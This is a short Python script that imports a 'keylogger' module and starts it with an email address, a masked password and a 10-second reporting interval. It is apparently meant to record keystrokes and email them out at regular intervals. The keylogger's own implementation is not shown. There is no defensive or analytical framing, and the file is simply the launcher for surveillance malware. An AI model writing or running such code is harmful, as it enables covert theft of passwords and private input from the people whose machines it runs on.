import keylogger

email = "test@gmail.com"
password = "***********"
time_interval = 10

my_keylogger = keylogger.Keylogger(email, password, time_interval)
my_keylogger.start()